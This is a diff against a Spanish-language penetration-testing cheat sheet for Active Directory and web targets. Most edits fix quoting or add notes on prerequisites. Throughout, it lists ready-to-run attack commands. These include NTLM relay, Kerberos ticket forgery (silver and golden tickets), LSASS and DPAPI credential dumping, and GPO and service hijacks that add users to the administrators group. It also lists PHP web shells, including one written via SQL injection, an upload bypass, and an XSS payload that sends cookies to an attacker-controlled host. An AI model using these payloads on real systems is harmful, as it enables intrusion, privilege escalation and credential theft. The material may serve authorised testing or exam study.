@@ -28,7 +28,7 @@ smbmap -H $IP
 nxc smb $DC_IP -u $USER -p $PASS --users
 nxc smb $DC_IP -u $USER -p $PASS --pass-pol
 # recolección para BloodHound
-bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP -c All --zip
+bloodhound-ce-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP -c All --zip
 # objetos sobre los que tengo permiso de escritura
 bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASS get writable --otype ALL
 ```
@@ -38,7 +38,7 @@ bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASS get writable --otype ALL
 ```text
 # envenenamiento LLMNR/NBT-NS
 sudo responder -I <iface> -d -w
-# relay a LDAPS creando una cuenta de máquina (abuso de MAQ)
+# LDAPS: requiere una autenticación relayable, CBT no exigido y autorización efectiva para crear el equipo
 ntlmrelayx.py -t ldaps://$DC_IP --add-computer 'PWN$' 'Pwn3d_Pass!'
 # coerción por PrinterBug / MS-RPRN (o PetitPotam / MS-EFSR)
 SpoolSample.exe $TARGET <listener_ip>
@@ -58,11 +58,11 @@ hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
 # TGT inicial + ticket de servicio (S4U)
 getTGT.py $DOMAIN/$USER -hashes :<NT_HASH> -dc-ip $DC_IP
 export KRB5CCNAME=$USER.ccache
-getST.py -spn 'cifs/$TARGET' -impersonate Administrator $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
+getST.py -spn "cifs/$TARGET" -impersonate Administrator $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
 # S4U2self + U2U (cuenta sin SPN propio y MAQ=0)
 describeTicket.py $USER.ccache | grep -i "session key"
 changepasswd.py $DOMAIN/$USER -hashes :<NT_HASH> -newhashes :<SESSION_KEY> -dc-ip $DC_IP
-getST.py -u2u -self -impersonate Administrator -altservice 'cifs/$TARGET' $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
+getST.py -u2u -self -impersonate Administrator -altservice "cifs/$TARGET" $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
 # Silver ticket (offline, con hash de la cuenta de servicio)
 ticketer.py -nthash <SVC_HASH> -domain-sid <SID> -domain $DOMAIN -spn MSSQLSvc/$HOST:1433 Administrator
 # Golden ticket (persistencia, con hash de krbtgt)
@@ -79,7 +79,7 @@ bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASS set password $VICTIM 'Pwn3d_
 bloodyAD ... add groupMember "$GROUP" $USER
 bloodyAD ... get object $USER --attr memberOf
 # WriteSPN → kerberoasting dirigido
-bloodyAD ... set object $VICTIM servicePrincipalName -v 'HTTP/temp.$DOMAIN'
+bloodyAD ... set object $VICTIM servicePrincipalName -v "HTTP/temp.$DOMAIN"
 # UPN swap (ADCS ESC9)
 bloodyAD ... set object $VICTIM userPrincipalName -v 'Administrator'
 # RBCD (delegación basada en recursos)
@@ -99,8 +99,8 @@ pypykatz lsa minidump lsass.dmp
 nxc smb $TARGET -u Administrator -H <HASH> --local-auth --dpapi
 # SecureString exportado bajo Constrained Language Mode (PowerShell)
 $sec = ConvertTo-SecureString -String $b64
-(New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER',$sec)).GetNetworkCredential().Password
-# gMSA
+(New-Object System.Management.Automation.PSCredential("$DOMAIN\$USER",$sec)).GetNetworkCredential().Password
+# gMSA: requiere autorización efectiva para recuperar msDS-ManagedPassword, no solo leer la política
 python3 gMSADumper.py -u $USER -p $PASS -d $DOMAIN -l $DC_IP
 # secretos locales de apps de escritorio
 LaZagne.exe all
@@ -141,7 +141,7 @@ evil-winrm -i $DC_IP -u Administrator -H <DA_HASH>
 nxc smb $DC_IP -u Administrator -H <DA_HASH> -x "whoami"
 # abuso de GPO (tarea programada inmediata)
 GPOwned.py -u $USER -d $DOMAIN -dc-ip $DC_IP -creategpo -name "GPO"
-GPOwned.py ... -gpoimmtask -taskname 'x' -dstpath 'cmd /c net localgroup administrators $USER /add'
+GPOwned.py ... -gpoimmtask -taskname 'x' -dstpath "cmd /c net localgroup administrators $USER /add"
 ```
 
 ## Pivoting & túneles
@@ -168,17 +168,17 @@ curl "http://$TARGET/?page=php://filter/convert.base64-encode/resource=index.php
 # LFI con bypass de WAF (traversal anidado)
 curl -X POST "http://$TARGET/dashboard.php" -b "PHPSESSID=<S>" -d "language=test//....//....//etc/passwd"
 # PHP session poisoning → RCE
-curl -X POST "http://$TARGET/index.php" -d 'username=<?php system($_GET[c]);?>&password=x' -c c.txt
+curl -X POST "http://$TARGET/index.php" -d 'username=<?php system($_GET["c"]);?>&password=x' -c c.txt
 # fuerza bruta de token débil
 ffuf -u http://$TARGET/reset.php -X POST -d "token=FUZZ&username=$USER" -w <(seq -w 0000 9999) -fs <n>
 # SQLi UNION → web shell (INTO OUTFILE)
-' UNION SELECT NULL,'<?php system($_REQUEST[c]);?>' INTO OUTFILE '/var/www/rev.php'-- -
+' UNION SELECT NULL,'<?php system($_REQUEST["c"]);?>' INTO OUTFILE '/var/www/rev.php'-- -
 # IDOR (swap de identificador)
 curl -X POST http://$TARGET/api/tokens -d '{"uid":"1","username":"administrator"}'
 # SSRF → command injection (salto de línea)
 curl -X POST http://$TARGET/api/healthcheck -d '{"url":"http://127.0.0.1:9090/?x=test%0aid"}'
 # upload con magic bytes → RCE
-echo 'GIF89a;<?php system($_GET[c]);?>' > shell.gif
+echo 'GIF89a;<?php system($_GET["c"]);?>' > shell.gif
 # XSS: robo de cookie
 <script>new Image().src="http://$IP:9001/?c="+document.cookie</script>
 ```
@@ -191,8 +191,8 @@ whoami /priv
 # sudo (GTFOBins)
 sudo -l
 sudo csvtool call '/bin/sh;false' /etc/passwd
-# hijack de binario de servicio (Server Operators)
-sc.exe config <svc> binPath="cmd /c net localgroup administrators $USER /add"
+# en cmd.exe: hijack de binario de servicio; reemplaza servicio y usuario
+sc.exe config <svc> binPath= "cmd /c net localgroup administrators <USUARIO_WINDOWS> /add"
 sc.exe start <svc>
 # SeImpersonate → SYSTEM (potato)
 God.exe -cmd "cmd /c whoami"
